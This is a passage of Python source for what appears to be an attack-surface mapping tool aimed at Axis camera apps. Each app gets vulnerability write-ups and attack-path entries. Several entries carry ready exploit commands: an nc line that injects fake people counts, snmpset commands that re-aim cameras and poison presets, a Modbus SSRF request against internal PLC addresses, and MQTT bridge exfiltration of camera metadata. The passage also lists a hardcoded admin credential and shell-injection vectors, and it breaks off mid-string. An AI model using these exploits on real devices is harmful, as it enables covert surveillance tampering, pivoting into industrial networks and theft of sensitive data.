                    'id': 'LPV-6',
                    'title': 'Cloud integration credential exposure',
                    'params': 'cloud_config/{user,password,http_auth_type,proxy_user,proxy_password,cloud_url}',
                    'access': 'Readable via test.cgi (operator) and config_json_o.cgi (operator)',
                    'impact': 'Cloud exfil endpoint credentials; proxy credential exposure',
                    'severity': 'MEDIUM',
                },
            ],
            'cloud_integrations': {
                'cloud1': 'cloud_config — generic HTTP cloud; auth_type selectable; events: new/lost/update/reliable/on_list/on_direction/on_roi',
                'cloud2': 'cloud2_config — second endpoint (fflprapp_cloud2.xml backup)',
                'cloud3': 'cloud3_config — third endpoint (fflprapp_cloud3.xml backup)',
                'hb': 'hb_config — heartbeat; sends device fingerprint JSON (IP, MAC, version, plate counts)',
                '2n': '2N intercom integration — plate events trigger door unlock via AccessController token API',
                'gsc': 'GSC3574 (Grandstream) integration — plate event push',
                'a91xx': 'Dahua A91xx IPC — plate events; ipc_login/ipc_password in axparameter',
                'a1601': 'Axis A1601 network door controller',
                'a1001': 'Axis A1001 network door controller',
            },
            'heartbeat_data': {
                'fields': 'platform, version, ipAddress, macAddress, osVersion, anprVersion, device_ID, numFrames, numberOfReads',
                'note': 'Sent to cloud_config/cloud_url periodically; full device fingerprint in cleartext JSON',
            },
            'license_gate': 'liblicensekey.so.1 — same bypass vectors as SipThirdPartyIntegration (appId 333330)',
            'version_diff_3010_to_3013': {
                'size_delta_bytes': 53248,
                'sha256_3010': '2ac0cc82b3b8',
                'sha256_3013': 'bbbeed435386',
                'new_subsystems': [
                    'PROTO_UTMC — UK Traffic Management system cloud protocol; new curl_easy_perform call path; '
                    'error tags: [PROTO_UTMC] curl_easy_perform() failed, [PROTO_UTMC] Failed to initialize curl',
                    'AXIS_TZ — timezone resolution via /config/rest/time/v2/timeZone REST endpoint',
                    'MAX_GAIN — camera gain control; JSON parse path with [MAX_GAIN] error tags',
                ],
                'auth_hardening': (
                    '"Invalid HttpAuthMethod : %lu" added — unsigned long validation on auth method enum; '
                    'likely closes a type confusion in http_auth_type axparameter parsing'
                ),
                'api_fix': (
                    'apiVersion field leading "?" removed from JSON serialization path '
                    '(was: ?{"apiVersion":"2.0"...}, now: {"apiVersion":"2.0"...}) — '
                    'malformed JSON fixed; previously parseable only with lenient decoders'
                ),
                'vehicle_model_db': (
                    'Model DB expanded: Skoda Rapid/Scala → Octavia/Rapid/Scala/Slavia/Superb '
                    '(2018-2024); Foton Tunland G7 (2018-2019 PICKUPTRUCK) added; '
                    'MINI Countryman 2024, Toyota Grand Highlander 2023 added'
                ),
                'sql_surface_unchanged': (
                    '"country is" string added in 3.0.13 — new country filter column reference; '
                    'AND COUNTRY LIKE format strings present in both versions; SQLi surface stable'
                ),
                'utmc_attack_surface': (
                    'PROTO_UTMC adds a new curl invocation path; if utmc_config/url (or equivalent '
                    'axparameter) is user-writable, UTMC cloud endpoint becomes an SSRF vector. '
                    'FIXME strings suggest incomplete validation: [PROTO_UTMC] FIXME: Invalid CloudConfig, '
                    '[PROTO_UTMC] FIXME: Invalid Config, [PROTO_UTMC] FIXME: Invalid event_fname'
                ),
            },
        }

        if pkg_dir and Path(pkg_dir).exists():
            # Pull manifest for version confirmation
            result['manifest'] = self._read_manifest(Path(pkg_dir))
            # Count models
            models_dir = Path(pkg_dir) / 'models'
            if models_dir.is_dir():
                result['model_count'] = len(list(models_dir.glob('*.tflite')))
            # Verify SQL injection strings in binary
            if binary and Path(binary).exists():
                strs = _strings(binary, min_len=5)
                result['sqli_strings_confirmed'] = any("AND LPR_UTF8 LIKE" in s for s in strs)
                result['shell_injection_strings_confirmed'] = any('--anyauth' in s for s in strs)
                result['camera_bwlist_confirmed'] = any('CAMERA_PASSWORD' in s for s in strs)
                result['gitlab_ref_confirmed'] = any('gitlab.f-f.kyiv.ua' in s for s in strs)

        return result

    def people_counter_surface(self, pkg_dir: str | None = None) -> dict:
        """
        AXIS People Counter (tvpc) aarch64 ELF attack surface.

        appId: 211490  binary: tvpc  version: 4.x (ARTPEC-8 build seen)

        Architecture: tvpc daemon + bundled curl binary (unstripped, OpenSSL 1.1) +
        libjson.so.0 + libnet_http.so.0 + libevent.so.0 + libparam.so.1

        Key findings:

        1. Shell injection via curl format strings (same class as LPV-2)
           tvpc calls popen()/system() with:
             "CURL_CA_BUNDLE=... /usr/local/packages/tvpc/curl -L -f --anyauth --insecure
              %s --user %s:%s \"%s/axis-cgi/opticscontrol.cgi\" ..."
           The %s slots: extra_flags, user, password, base_url — all from axparameter.
           Operator-level write to any of these params → shell injection → RCE.
           Additional shell calls:
             "cd /tmp/; tar czf tvpc-parambackup.tar.gz parambackup.txt params.meta"
             → backup archive path not sanitized; tar path injection via $TMPDIR.

        2. Unauthenticated backup restore (.restore_backup CGI, operator-level)
           Endpoint: /people-counter/.restore_backup (operator)
           Restores from /tmp/backup/ including:
             "cp /tmp/backup/licbackup.xml /usr/local/packages/tvpc/lic.xml"  — license override
             "cp /tmp/backup/pems/*.pem /usr/local/packages/tvpc/localdata"   — cert injection
           Attacker-supplied .tar.gz archive → unpack to /tmp/backup/ → overwrite license + TLS certs.
           Chain: operator access → inject malicious backup → license bypass + cert swap.

        3. Master/slave sync on TCP 4066 (unauthenticated peer sync)
           Counter0SlavePort/Counter0MasterPort default: 4066 (not TLS).
           "check-slave-auth" string present but slave peering uses shared connection_key.json.
           "DPID: duplicate peer identity - disconnecting peer" → peer identity via DPID, not cryptographic.
           Counter0SlaveAddress: attacker-controlled string; points tvpc at rogue master.
           Attack: MITM the 4066 channel → inject false people-count data.

        4. Event listener injection on TCP 23456
           Counter0EventListenerPort: 23456 (default)
           Counter0EventListenerMessage: "passage"
           Network-accessible; injects passage events into the counter logic from any host.
           No authentication observed in param.conf — open by default on the camera LAN.

        5. API key generation weakness
           Charset: ABCDEFGHJKLMNPQRSTUVWXYZ23456789 (Crockford base32, 32 chars)
           CreateKeys function generates viewer/operator/admin api_keys stored in axparameter.
           Key length unknown from strings alone; charset suggests 5 bits/char.
           Keys served in connection_key.json — check file permissions.

        6. Privacy anonymization bind mount (privilege escalation surface)
           modules/anon-gui/anon/privacy.sh: mount --bind $OVERRIDE_FOLDER $EVENT_FOLDER
           Installs at operator/admin level; bind mounts attacker-controlled dir over
           /etc/actionengine/user/1/ — overwrites Axis action engine event handlers.
           If $OVERRIDE_FOLDER is user-controlled input, arbitrary filesystem bind mount.

        7. Occupancy Estimator alias (hidden endpoint)
           apache.conf rewrites /occupancy-estimator/ → /people-counter/
           Both sets of CGI endpoints exist at viewer/operator/admin levels.
           RewriteCond checks /tmp/tvpc-web-running — if deleted, redirect to request-failure.html
           with ?redirector= param (open redirect surface).

        CGI access:
          viewer:    /people-counter/.api, /occupancy-estimator/.api
          operator:  .apioperator, .restore_backup (both apps)
          admin:     .apiadmin (both apps)
        """
        if pkg_dir is None:
            pd = self.packages.get('tvpc') or self.packages.get('AXIS_People_Counter')
            if pd:
                pkg_dir = str(pd)

        binary = str(Path(pkg_dir) / 'tvpc') if pkg_dir else None

        result = {
            'binary': binary,
            'app_id': 211490,
            'app_name': 'AXIS People Counter',
            'binary_name': 'tvpc',
            'arch': 'aarch64 ELF stripped',
            'bundled_binaries': ['curl (unstripped, debug info, OpenSSL 1.1.x)', 'libcurl.so.4', 'libjson.so.0'],
            'sync_ports': {'master_slave': 4066, 'event_listener': 23456},
            'libs': [
                'libparam.so.1', 'libevent.so.0', 'libnet_http.so.0', 'libglib-2.0.so.0',
                'libaxevent.so.1', 'libaxhttp.so.1', 'libaxparameter.so.1',
                'libvdostream.so.1', 'libcurl.so.4', 'libjson.so.0', 'liblicensekey.so.1',
            ],
            'attack_paths': [
                {
                    'id': 'PC-1',
                    'title': 'Shell injection via VAPIX curl command format strings',
                    'mechanism': 'popen() with --user %s:%s; user/password/URL from axparameter store',
                    'cgi': 'config write via .apioperator (operator)',
                    'impact': 'RCE as ACAP process user; pivot to camera root',
                    'severity': 'CRITICAL',
                    'exploit': 'Set Camera0SlaveAddress to IP containing shell metacharacters',
                },
                {
                    'id': 'PC-2',
                    'title': 'Backup restore: license override + cert injection via .restore_backup',
                    'cgi': '/people-counter/.restore_backup (operator)',
                    'mechanism': (
                        'Restore unpacks /tmp/backup/; copies licbackup.xml → lic.xml, '
                        'pems/*.pem → localdata/; attacker controls archive content'
                    ),
                    'impact': 'License bypass (lic.xml swap) + TLS cert injection; auth bypass chain',
                    'severity': 'HIGH',
                },
                {
                    'id': 'PC-3',
                    'title': 'Unauthenticated people-count injection via TCP 23456',
                    'mechanism': 'Counter0EventListenerPort 23456 accepts "passage" messages from any LAN host',
                    'impact': 'Spoof occupancy/people-count data; trigger access control decisions',
                    'severity': 'HIGH',
                    'exploit': 'echo "passage" | nc <camera-ip> 23456',
                },
                {
                    'id': 'PC-4',
                    'title': 'Master/slave sync MITM on TCP 4066',
                    'mechanism': 'Unencrypted peer sync; DPID-based identity; no cryptographic challenge',
                    'impact': 'Inject false counts to slave cameras; corrupt occupancy analytics',
                    'severity': 'MEDIUM',
                },
                {
                    'id': 'PC-5',
                    'title': 'Privacy anonymization bind mount over action engine directory',
                    'mechanism': 'privacy.sh mount --bind $OVERRIDE_FOLDER /etc/actionengine/user/1/',
                    'impact': 'Overwrite Axis event handlers; disable or redirect camera event actions',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Operator/admin level; triggered by anon mode toggle',
                },
                {
                    'id': 'PC-6',
                    'title': 'Open redirect in request-failure.html fallback',
                    'mechanism': 'apache.conf redirects to /request-failure.html?redirector=$4 when tvpc not running',
                    'impact': 'Phishing redirect from camera hostname; admin credential harvest',
                    'severity': 'LOW',
                },
            ],
            'api_key_charset': 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789 (Crockford base32, ~5 bits/char)',
            'key_files': ['connection_key.json', 'localdata/pems/*.pem', 'lic.xml', 'cacert.pem'],
            'sql_surface': 'SQLite backend; "Error when preparing to send data to SQL" in binary',
            'license_gate': 'liblicensekey.so.1 + lic.xml backup/restore chain',
            # 4.6.110 aarch64 binary RE additions
            'version_4610': {
                'arch': 'aarch64 ELF stripped (ARTPEC-8 compatible)',
                'popen_in_zoom_param': 'cm_param_get_212_zoom(): popen — zoom param read via shell command',
                'slave_pass_in_axparam': 'Counter.SlavePass in axparameter (pre-4.6.110); 4.6.110 adds cm_secret.c secrets storage (Migrating parameter %s to secrets); migrated SlavePass not in params.meta but still readable via secrets API if accessible',
                'backup_param_filter': 'parhandclient getgroup root.tvpc | grep -v -e 0SysPwd — SlavePass NOT filtered → exported plaintext (pre-migration builds)',
                'curl_command_shell_injectable': [
                    "CURL_CA_BUNDLE=... /usr/local/packages/tvpc/curl -L -f --anyauth --insecure %s --user %s:%s \"%s/axis-cgi/opticscontrol.cgi\"",
                    "CURL_CA_BUNDLE=... /usr/local/packages/tvpc/curl -L -f --anyauth -k --user \"%s:%s\" \"%s/axis-cgi/com/ptz.cgi?zoom=%d%s\"",
                    "CURL_CA_BUNDLE=... /usr/local/packages/tvpc/curl -L -f --anyauth %s %s -s -m 20 -o curl_response.txt '%s://%s%s/api/?method=camera.ping&encrypted=true'",
                ],
                'removed_legacy_account': 'TrueviewVAPIX account removed in postinst.sh (was weak-password default account in prior versions)',
                'kill_format_string': '(sleep 20; kill -9 %d && echo ...) — PID value from int; verify if PID source is attacker-controllable',
                'html_pages': [
                    'statistics.html', 'settings.html', 'settings-neighbour-counters.html',
                    'settings-data-export.html', 'settings-anonymize.html',
                    'settings-occupancy.html', 'settings-one-way-trigger.html',
                    'registration.html', 'liveview.html', 'quickstart.html',
                    'settings-tailgating.html',
                ],
            },
        }

        if pkg_dir and Path(pkg_dir).exists():
            result['manifest'] = self._read_manifest(Path(pkg_dir))
            if binary and Path(binary).exists():
                strs = _strings(binary, min_len=5)
                result['shell_cmd_confirmed'] = any('--anyauth' in s and 'tvpc/curl' in s for s in strs)
                result['restore_backup_confirmed'] = any('licbackup.xml' in s for s in strs)
                result['event_listener_confirmed'] = any('23456' in s for s in strs)
                result['slave_sync_confirmed'] = any('check-slave-auth' in s for s in strs)
                result['api_key_gen_confirmed'] = any('CreateKeys' in s for s in strs)

        return result

    def ptz_snmp_surface(self, pkg_dir: str | None = None) -> dict:
        """
        PTZ_over_SNMP (axptzoversnmp) MIPS32 ELF attack surface.

        appId: 47267  arch: mipsisa32r2el (legacy MIPS)
        Implements NTCIP 1205 CCTV MIB via Axis ax_mib_* framework.

        Critical finding: Full PTZ camera control writable via SNMP SET
        if community string allows write access (default "write" community on many Axis
        cameras that have SNMP enabled from factory or admin config).

        Writable NTCIP OIDs (base: 1.3.6.1.4.1.1206.4.2.7):
          .3.1.0  GotoPreset         — send camera to stored position
          .3.2.0  SetPreset          — overwrite any preset with attacker pan/tilt
          .4.1.0  Pan                — direct pan control
          .4.2.0  Tilt               — direct tilt control
          .4.3.0  Zoom               — zoom control
          .4.4.0  Focus              — focus control
          .4.5.0  Iris               — iris/exposure control
          .5.1.0  CameraFeatureCtrl  — enable/disable camera features
          .5.4.0  LensFeatureCtrl    — lens feature control

        Library: libPTZoverSNMP.so implements ax_mib_set_obj_val for all listed OIDs.
        Community string auth: delegated to camera SNMP agent (net-snmp or axsnmpd).
        Default Axis SNMP write community: "write" (changeable but commonly left default).

        Attack: snmpset -c write -v 2c <camera_ip> 1.3.6.1.4.1.1206.4.2.7.4.1.0 i 9000
        → rotates camera fully (pan = 9000 centidegrees) without camera web auth.

        Additional: Axis MIBs also expose camera model, firmware version, serial number
        via Global module OIDs (1.3.6.1.4.1.1206.4.2.6.*) — device fingerprinting without auth.
        """
        if pkg_dir is None:
            pd = self.packages.get('axptzoversnmp')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'axptzoversnmp') if pkg_dir else None,
            'app_id': 47267,
            'app_name': 'PTZ over SNMP',
            'arch': 'MIPS32 little-endian (mipsisa32r2el) — legacy',
            'protocol': 'SNMP v1/v2c (no v3 auth/priv observed in strings)',
            'mib': 'NTCIP 1205 CCTV MIB (1.3.6.1.4.1.1206.4.2.7)',
            'attack_paths': [
                {
                    'id': 'SNMP-1',
                    'title': 'Unauthenticated PTZ control via SNMP SET (write community)',
                    'mechanism': 'NTCIP CCTV MIB writable OIDs; community auth only (no session/token)',
                    'impact': 'Full camera aim control: pan, tilt, zoom, focus, iris, preset manipulation',
                    'severity': 'HIGH',
                    'exploit': 'snmpset -c write -v 2c <ip> 1.3.6.1.4.1.1206.4.2.7.4.1.0 i <pan_centideg>',
                    'prerequisite': 'SNMP enabled + write community known (default "write" or "private")',
                },
                {
                    'id': 'SNMP-2',
                    'title': 'Device fingerprinting via SNMP GET (read community)',
                    'mechanism': 'Global module OIDs expose model, firmware, hardware version without camera web auth',
                    'impact': 'Passive device fingerprinting; target selection for version-specific exploits',
                    'severity': 'LOW',
                    'exploit': 'snmpwalk -c public -v 2c <ip> 1.3.6.1.4.1.1206',
                },
                {
                    'id': 'SNMP-3',
                    'title': 'Preset poisoning (SetPreset via SNMP SET)',
                    'mechanism': 'OID .3.2.0 SetPreset overwrites stored camera position; persists across reboots',
                    'impact': 'Persistent blind spot creation; survives until admin restores preset manually',
                    'severity': 'HIGH',
                    'exploit': 'snmpset -c write -v 2c <ip> 1.3.6.1.4.1.1206.4.2.7.3.2.0 i <preset_num>',
                },
            ],
            'writable_oids': {
                '1.3.6.1.4.1.1206.4.2.7.3.1.0': 'GotoPreset',
                '1.3.6.1.4.1.1206.4.2.7.3.2.0': 'SetPreset',
                '1.3.6.1.4.1.1206.4.2.7.4.1.0': 'Pan',
                '1.3.6.1.4.1.1206.4.2.7.4.2.0': 'Tilt',
                '1.3.6.1.4.1.1206.4.2.7.4.3.0': 'Zoom',
                '1.3.6.1.4.1.1206.4.2.7.4.4.0': 'Focus',
                '1.3.6.1.4.1.1206.4.2.7.4.5.0': 'Iris',
                '1.3.6.1.4.1.1206.4.2.7.5.1.0': 'CameraFeatureControl',
                '1.3.6.1.4.1.1206.4.2.7.5.4.0': 'LensFeatureControl',
            },
            'library': 'lib/libPTZoverSNMP.so (ax_mib_set_obj_val, ax_mib_get_obj_val)',
            'note': 'No TLS/SNMPv3 observed; all PTZ control over cleartext SNMP UDP/161',
        }
        return result

    def sensor_metrics_surface(self, pkg_dir: str | None = None) -> dict:
        """
        AXIS Sensor Metrics Dashboard (metricdashboard) aarch64 ELF attack surface.

        appId: 413965  binary: metricdashboard  version: 4.4.0
        Ships: libmodbus.so.5.1.0, libnmea.so — Modbus TCP/RTU + NMEA GPS bridge on camera.

        This is a camera-mounted ICS/SCADA bridge: connects to Modbus industrial sensors
        and overlays their readings onto camera video streams. Makes cameras OT-adjacent.

        Critical findings:

        1. Modbus TCP to attacker-controlled host (data-source.cgi, admin-level)
           Administrator can configure Modbus device IP + register set via data-source.cgi.
           metricdashboard connects as Modbus client to configured IP:502.
           If attacker controls admin session → point Modbus client at internal OT network
           → blind Modbus register scan of otherwise-unreachable ICS devices (SSRF via Modbus).
           Alternatively: configured external IP → camera exfiltrates sensor readings to attacker.

        2. Serial bus acquisition (RS-485 via /dev/ttyPCC1)
           "Failed to acquire serial bus for %s" — app acquires exclusive RS-485 bus access.
           DataProducerModbusSerial class connects to sensors on the camera's physical RS-485 port.
           If app crashes or is SIGKILL'd, serial bus may remain locked, DoS'ing other ACAP apps.
           Modbus RTU frames to/from /dev/ttyPCC1 have no authentication by design.

        3. NMEA GPS data injection via RS-485
           DataProducer 'NMEA' class parses NMEA 0183 sentences from serial port.
           If attacker can inject bytes into the RS-485 bus (physical access or bridge device),
           can spoof GPS coordinates overlaid on camera video — location falsification.

        4. Dynamic overlay credential exposure
           "Failed to retrieve VAPIX credentials" — app fetches VAPIX service account creds
           from com.axis.HTTPConf1.VAPIXServiceAccounts1 to call dynamicoverlay.cgi.
           VAPIX service account token is logged on failure — credential in log file.

        CGI: /app-settings.cgi (admin), /data-source.cgi (admin) — both fastCgi
        """
        if pkg_dir is None:
            pd = self.packages.get('metricdashboard') or self.packages.get('AXIS_Sensor_Metrics_Dashboard')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'metricdashboard') if pkg_dir else None,
            'app_id': 413965,
            'app_name': 'AXIS Sensor Metrics Dashboard',
            'arch': 'aarch64 ELF stripped (PIE)',
            'libs': ['libmodbus.so.5.1.0', 'libnmea.so', 'libaxparameter.so.1', 'libaxevent.so.1'],
            'serial_device': '/dev/ttyPCC1 (RS-485 bus on ARTPEC cameras)',
            'protocols': ['Modbus TCP (port 502)', 'Modbus RTU (RS-485)', 'NMEA 0183 (GPS)', 'VAPIX HTTP loopback'],
            'attack_paths': [
                {
                    'id': 'SMD-1',
                    'title': 'Modbus TCP SSRF — camera pivots to internal OT/ICS network',
                    'cgi': '/data-source.cgi (admin)',
                    'mechanism': 'Attacker-controlled Modbus device IP; metricdashboard connects as Modbus client',
                    'impact': 'Blind Modbus register read/write on internal ICS network unreachable from attacker',
                    'severity': 'HIGH',
                    'exploit': 'POST /data-source.cgi ip=<internal_plc_ip>&port=502&unit_id=1',
                },
                {
                    'id': 'SMD-2',
                    'title': 'NMEA GPS spoofing via RS-485 injection',
                    'mechanism': 'Physical RS-485 bus access; inject forged NMEA $GPRMC sentences',
                    'impact': 'False GPS coordinates overlaid on camera video; location falsification for evidence',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Physical access to RS-485 wiring or bridge device on same bus',
                },
                {
                    'id': 'SMD-3',
                    'title': 'VAPIX service account credential exposure in error log',
                    'mechanism': '"Failed to retrieve VAPIX credentials" error logs cred path; service account token in /tmp or syslog',
                    'impact': 'Pivot to VAPIX API with service account token; further camera control',
                    'severity': 'MEDIUM',
                },
                {
                    'id': 'SMD-4',
                    'title': 'Serial bus DoS via forced ACAP crash',
                    'mechanism': 'ttyPCC1 bus acquired exclusively; SIGKILL of metricdashboard may leave bus locked',
                    'impact': 'DoS for all RS-485-dependent ACAP apps on the camera',
                    'severity': 'LOW',
                },
            ],
            'data_producers': ['DataProducerModbus', 'DataProducerModbusIp', 'DataProducerModbusSerial', 'NMEA'],
            'cgi_access': 'administrator only (/app-settings.cgi, /data-source.cgi)',
            # Source tarball RE (AXIS_Sensor_Metrics_Dashboard_4_4_0_src.tar.gz)
            'bundled_source': {
                'libmodbus_version': '3.1.11',
                'libmodbus_upstream': 'https://libmodbus.org (LGPL 2.1)',
                'libnmea_version': 'git snapshot (nmea_pars* API)',
                'nmea_buffers': 'NMEA_CONVSTR_BUF=256, NMEA_TIMEPARSE_BUF=256 (fixed stack buffers)',
                'build_targets': ['armv7hf (arm-linux-gnueabihf)', 'aarch64 (aarch64-linux-gnu)'],
                'sdk': 'axisecp/acap-sdk:3.5',
                'note': 'Source ships upstream libs only; no AXIS-specific app C source included',
            },
        }
        return result

    def metadata_provider_surface(self, pkg_dir: str | None = None) -> dict:
        """
        Metadata Provider (metadata_provider) ARM32 ELF attack surface.

        appId: 413493  binary: metadata_provider + bundled mosquitto MQTT broker  arch: armv7hf
        Ships: libpaho-mqtt3as.so.1.3.1, libmetadataproducer.so, mosquitto 2.x

        Architecture: metadata_provider subscribes to Axis camera metadata (video analytics,
        PTZ events, audio detect) via libmetadataproducer.so, bridges to external MQTT broker.
        Bundled mosquitto runs locally at localhost:1883 with anonymous auth.

        Findings:

        1. MQTT broker anonymous access (allow_anonymous true, localhost:1883)
           Any process on the camera can connect to the bundled MQTT broker without auth.
           From ACAP package context (post-RCE): subscribe to all camera metadata topics.
           $SYS/broker/log/# subscribed — full broker log visibility.

        2. MQTT bridge SSRF + hostname injection via bridgeBroker CGI
           CGI_MethodHandlerBridgeBroker creates outbound MQTT connection to attacker-controlled URL.
           addhost.sh appends to /etc/hosts without validation:
             "echo $1 $2 >> /etc/hosts" — no dedup, no sanitization.
           Bridge URL hostname resolved after /etc/hosts injection → SSRF to internal host.

        3. Camera metadata exfiltration via MQTT bridge
           Once bridge established: all metadata (face detections, person counts, plate reads,
           motion events, PTZ positions) forwarded to attacker's MQTT broker in real time.
           No per-topic ACL by default (acl_file not set in mosquitto.conf).

        4. Paho MQTT TLS negotiation bypass
           caCert, clientCert strings present but no enforce-TLS found in binary strings.
           Bridge may connect without TLS to external broker if not explicitly configured.
        """
        if pkg_dir is None:
            pd = self.packages.get('metadata_provider') or self.packages.get('Metadata_provider')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'metadata_provider') if pkg_dir else None,
            'app_id': 413493,
            'app_name': 'Metadata Provider',
            'arch': 'ARM32 (armv7hf) ELF stripped',
            'bundled_binaries': ['mosquitto (MQTT broker, ARM32)', 'libpaho-mqtt3as.so.1.3.1'],
            'mosquitto_config': {
                'listener': 'localhost:1883',
                'allow_anonymous': True,
                'password_file': None,
                'acl_file': None,
                'tls': False,
            },
            'attack_paths': [
                {
                    'id': 'MDP-1',
                    'title': 'MQTT bridge SSRF via bridgeBroker CGI + /etc/hosts injection',
                    'cgi': 'CGI_MethodHandlerBridgeBroker (method: bridgeBroker)',
                    'mechanism': 'addhost.sh appends <ip> <hostname> to /etc/hosts without validation; bridge URL uses injected hostname',
                    'impact': 'SSRF to internal hosts; exfiltrate camera metadata to attacker MQTT broker',
                    'severity': 'HIGH',
                    'exploit': 'POST bridgeBroker with brokerUrl=mqtt://internal-host:1883 + addhost inject',
                },
                {
                    'id': 'MDP-2',
                    'title': 'Camera metadata stream exfiltration via MQTT bridge',
                    'mechanism': 'Once bridge established, all video analytics metadata forwarded to external broker',
                    'impact': 'Real-time face detections, people counts, plate reads, motion events leaked',
                    'severity': 'HIGH',
                },
                {
                    'id': 'MDP-3',
                    'title': 'Anon MQTT access (localhost:1883) post-RCE lateral move',
                    'mechanism': 'allow_anonymous true; any local process subscribes to all camera metadata',
                    'impact': 'Post-RCE: full metadata access without separate auth',
                    'severity': 'MEDIUM',
                },
            ],
            'schemas': 'schemas/message_example.json (message format for bridged metadata)',
        }
        return result

    def a3dpc_surface(self, pkg_dir: str | None = None) -> dict:
        """
        AXIS 3D People Counter (a3dpc) MIPS32 ELF attack surface.

        appId: 211491  binaries: a3dpc + pyrun (Python 4.5MB runtime)  arch: mipsisa32r2el
        Ships: pyrun (self-contained Python interpreter), libwrapper.so (5.5MB), libnlopt.so

        Architecture: a3dpc is a C stub; core logic runs in Python via pyrun (embedded Python).
        Apache reverse proxy forwards /stereo/* to Python app at localhost:50000.
        libwrapper.so wraps the stereo depth-sensing algorithm.

        Critical findings:

        1. Admin-level package management CGI endpoints (RCE via ACAP package install)
           /cmd/install   — installs a new ACAP package (from URL or upload?)
           /cmd/download  — downloads files to device
           /cmd/upgrade   — upgrades the app
           /cmd/purge     — purge/reset all data
           If /cmd/install accepts a URL, attacker can install a malicious EAP.
           These are admin-level only — but combined with any admin credential leak → RCE.

        2. Password logging: "GOT proxy_password: %s" (in a3dpc binary)
           Proxy password printed to debug log/stdout; if logging to file, plaintext cred in log.

        3. X-Forwarded-User header injection
           Apache config: RequestHeader unset Authorization (strips auth)
             then RewriteRule injects X-Forwarded-User from REMOTE_USER env var.
           Python app at localhost:50000 may trust X-Forwarded-User as identity.
           If REMOTE_USER can be spoofed (e.g., other ACAP app on camera calling loopback),
           Python app processes requests as arbitrary user.

        4. Stereo depth sensor data — privacy surface
           libwrapper.so processes stereo depth frames (3D people detection via depth camera).
           Depth map data sent to Python at 50000; if /stereo endpoint leaks raw depth frames,
           attacker with viewer access can reconstruct 3D scenes.

        5. Internal proxy without auth forwarding
           ProxyPass to http://127.0.0.1:50000 after unsetting Authorization header.
           Python app at 50000 gets no credentials — relies solely on Apache-level auth.
           If localhost:50000 is reachable from other ACAP apps (no firewall), unauthenticated
           access to Python app possible from co-resident ACAP.
        """
        if pkg_dir is None:
            pd = self.packages.get('a3dpc') or self.packages.get('3DPeopleCounter')
            if pd:
                pkg_dir = str(pd)

        result = {
            'binary': str(Path(pkg_dir) / 'a3dpc') if pkg_dir else None,
            'app_id': 211491,
            'app_name': 'AXIS 3D People Counter',
            'arch': 'MIPS32 little-endian (mipsisa32r2el) — legacy',
            'bundled_binaries': ['pyrun (Python 4.5MB self-contained runtime)', 'libwrapper.so (5.5MB depth algorithm)'],
            'internal_service': 'Python app at localhost:50000 (proxied via Apache /stereo)',
            'attack_paths': [
                {
                    'id': 'A3DPC-1',
                    'title': 'Admin CGI package install/download — potential RCE via malicious EAP URL',
                    'cgi': '/cmd/install, /cmd/download, /cmd/upgrade (admin)',
                    'mechanism': 'Admin-level endpoints trigger ACAP package operations; if URL-based, install attacker EAP',
                    'impact': 'RCE via malicious ACAP package; persistent foothold via installed app',
                    'severity': 'HIGH',
                    'prerequisite': 'Admin-level auth (combined with any admin cred leak = RCE chain)',
                },
                {
                    'id': 'A3DPC-2',
                    'title': 'Proxy password plaintext logging',
                    'mechanism': '"GOT proxy_password: %s" in a3dpc binary — cred logged to stdout/debug log',
                    'impact': 'Proxy credential exposure; pivot to configured proxy or remote system',
                    'severity': 'MEDIUM',
                },
                {
                    'id': 'A3DPC-3',
                    'title': 'X-Forwarded-User spoofing from co-resident ACAP',
                    'mechanism': 'Apache strips Authorization, injects X-Forwarded-User; Python app at 50000 trusts it',
                    'impact': 'If another ACAP app can make loopback requests to 50000, it can impersonate any user',
                    'severity': 'MEDIUM',
                },
                {
                    'id': 'A3DPC-4',
                    'title': 'Depth frame exfiltration via /stereo viewer endpoint',
                    'mechanism': 'Viewer-accessible /stereo proxy; Python app may serve raw depth map data',
                    'impact': '3D scene reconstruction; privacy violation beyond standard video',
                    'severity': 'MEDIUM',
                },
            ],
            'cgi_endpoints': {
                'administrator': ['/status', '/version', '/work', '/cmd/install', '/cmd/purge', '/cmd/download', '/cmd/upgrade', '/app/version', '/app/restart', '/pages'],
            },
            'python_version': '2.7 (EOL 2020-01-01)',
            'developer_path_leak': '/home/gustafo/3dcounter/package/',
            'hardcoded_credential': 'admin:1password23 (from pyc string constants)',
            'flask_routes': [
                '/anonymize/anonymize', '/anonymize/anonymized.json', '/anonymize/reset',
                '/awb/<key>.csv', '/awb/clear/<key>',
                '/axis-cgi/mjpg/video.cgi?{params}',
                '/calibrate/start', '/calibrate/stop', '/calibrate/clear',
                '/config.json', '/config/video.json', '/configure.html',
                '/counts.json', '/data/clear',
                '/debug_download', '/debug_download_prepare', '/debug/log/<level>',
                '/export_meta.json', '/export_raw.%s',
                '/fake/down', '/fake/up',
                '/full_zone_params_recalculation.json',
                '/params.json',
                '/temporary_api/snr', '/temporary_api/zone',
            ],
            'path_traversal_constant': '/../ present as string constant in app_api.pyc',
            'popen_import': 'subprocess.Popen imported in app_api.pyc',
            'reporting_integration': {
                'target': 'AXIS StoreDataManager via counter.reporting.datamanager.*',
                'params': ['url', 'folder_identifier', 'folder_password'],
                'password_storage': 'counter.reporting.datamanager.folder_passwords in axparameter',
            },
            'privacy_script_injection': {
                'file': 'anon/privacy.sh',
                'vector': 'PRIVACY_IMAGE_URL to sed without sanitization — expression injection',
            },
            'filter_events_injection': {
                'file': 'anon/filter_events.sh',
                'vector': 'rm $F unquoted find output — glob/word-split on rm path',
            },
            'eap_wrapper_binary_re': {
                'binary': 'a3dpc (MIPS32 mipsisa32r2el, not stripped, debug info)',
                'version': '1.8.3 (package.conf)',
                'functions': [
                    'download_task', 'download_view', 'install_task', 'install_view',
                    'purge_task', 'purge_view', 'manifest_load_package', 'manifest_check_blacklist',
                    'set_exposure_params', 'create_worker', 'pipe_to_log', 'pages_to_json',
                    'set_log_level', 'enable_debug',
                ],
                'exec_pattern': (
                    '"Executing \'%s\'" — g_spawn_async_with_pipes used for subprocess execution. '
                    'Combined with download_task, this creates an unzip/install subprocess chain '
                    'for downloaded ACAP packages. If download URL (DOWNLOAD_URL) accepts '
